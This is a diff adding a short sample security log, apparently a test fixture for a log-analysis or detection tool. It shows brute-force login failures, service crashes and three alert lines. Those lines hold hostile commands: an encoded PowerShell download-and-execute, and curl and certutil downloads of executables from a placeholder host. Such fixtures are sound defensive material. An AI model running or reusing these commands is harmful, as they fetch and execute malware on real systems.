@@ -1,0 +1,9 @@
+2026-05-22 11:00:00 WARNING Failed login for user admin from 10.0.0.5
+2026-05-22 11:00:02 WARNING Failed password for user root from 10.0.0.5
+2026-05-22 11:00:04 WARNING Authentication failed for administrator from 10.0.0.5
+2026-05-22 11:01:00 ERROR Service crashed: Windows Update Service
+2026-05-22 11:01:30 ERROR Service stopped unexpectedly
+2026-05-22 11:02:00 CRITICAL Application error: service failure detected
+2026-05-22 11:03:00 ALERT powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
+2026-05-22 11:04:00 ALERT cmd.exe /c curl http://suspicious-example.test/payload.exe -o payload.exe
+2026-05-22 11:05:00 ALERT certutil -urlcache -split -f http://suspicious-example.test/a.exe a.exe
